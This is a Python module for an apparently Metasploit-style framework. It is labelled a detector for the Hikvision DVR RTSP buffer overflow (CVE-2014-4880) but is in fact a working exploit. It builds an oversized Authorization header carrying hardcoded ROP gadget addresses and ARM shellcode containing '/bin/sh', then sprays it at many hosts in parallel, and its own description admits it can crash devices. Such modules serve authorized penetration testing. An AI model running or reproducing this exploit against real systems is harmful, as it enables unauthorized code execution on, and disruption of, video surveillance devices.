import socket
import struct
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

G_ADJUSTESP = 0x002c828c
G_R3FROMSP  = 0x00446f80
G_BLXR3_POP = 0x00456360
G_POPR3     = 0x0000fe98

MARKER = "METIS_VULN_MARKER_8f3a2c"

@dataclass
class HostResult:
    host: str
    state: str
    detail: str = ""

class HikvisionRTSPDetector(Auxiliary):
    NAME = "Hikvision DVR RTSP Buffer Overflow Detector (CVE-2014-4880)"
    DESCRIPTION = (
        "Detects the RTSP buffer overflow in Hikvision DVR DS-7204 firmware "
        "V2.2.10 build 131009 by sending a crafted PLAY request containing a "
        "ROP chain that redirects execution to an inline shellcode stub. The "
        "stub echoes a unique marker back over the RTSP response. If the "
        "marker appears, the device is vulnerable. Note: this check triggers "
        "the vulnerability - a non-vulnerable or patched device may crash."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "normal"
    SEVERITY = "critical"
    DISCLOSED = "2014-11-19"
    CHECK = True
    REFERENCES = [
        "CVE-2014-4880",
        "https://www.rapid7.com/blog/post/2014/11/19/r7-2014-18-hikvision-dvr-devices-multiple-vulnerabilities/",
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/hikvision_rtsp_bof.rb",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=554, type=int, description="RTSP port"),
        Option("TIMEOUT", default=10.0, type=float, description="connection timeout"),
        Option("READ_TIMEOUT", default=3.0, type=float,
               description="seconds to wait for the response after sending"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _marker_shellcode(self):
        marker = MARKER.encode()

        code = bytearray()
        code += b"\x01\x30\x8f\xe2"
        code += b"\x13\xff\x2f\xe1"
        code += b"\x78\x46"
        code += b"\x0c\x30"
        code += b"\x01\x21"
        code += b"\x02\x22"
        code += b"\x92\x00"
        code += b"\x0b\x27"
        code += b"\x01\xdf"
        code += b"\x00\x00"
        code += b"/bin/sh\x00"
        code += marker + b"\x00"
        return bytes(code)

    def _build_request(self, host):
        padding = b"A" * (0x280 + 34)

        rop_chain = struct.pack("<I", G_ADJUSTESP)
        rop_chain += struct.pack("<I", G_R3FROMSP)
        rop_chain += struct.pack("<I", G_BLXR3_POP)
        rop_chain += struct.pack("<I", G_POPR3)

        shellcode = self._marker_shellcode()

        return (
            b"PLAY rtsp://" + host.encode() + b"/ RTSP/1.0\r\n"
            b"CSeq: 7\r\n"
            b"Authorization: Basic "
            + padding
            + rop_chain
            + shellcode
            + b"\r\n\r\n"
        )

    def _probe(self, host):
        port = self.options["RPORT"]
        timeout = self.options["TIMEOUT"]
        read_wait = self.options["READ_TIMEOUT"]

        try:
            sock = socket.create_connection((host, port), timeout=timeout)
        except OSError as e:
            return HostResult(host, "unknown", type(e).__name__)

        request = self._build_request(host)
        response = b""
        try:
            sock.sendall(request)
            sock.settimeout(read_wait)
            deadline = time.time() + read_wait
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if MARKER.encode() in response:
                    break
        except OSError:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

        if not response:
            return HostResult(host, "unknown", "no response")

        text = response.decode(errors="replace")

        if MARKER in text:
            return HostResult(host, "vulnerable", "marker echoed")

        if "RTSP/1.0 404" in text or "RTSP/1.0 401" in text:
            return HostResult(host, "safe", text.split("\r\n")[0])

        return HostResult(host, "unknown", text[:80].strip())

    def _record_host_result(self, h):
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name="rtsp", banner="",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2014-4880",
            info=h.detail,
        )

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + host + ":" + str(self.options["RPORT"])))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info(
            "scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"
        ))

        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception as e:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))

        return [h.host for h in hits]
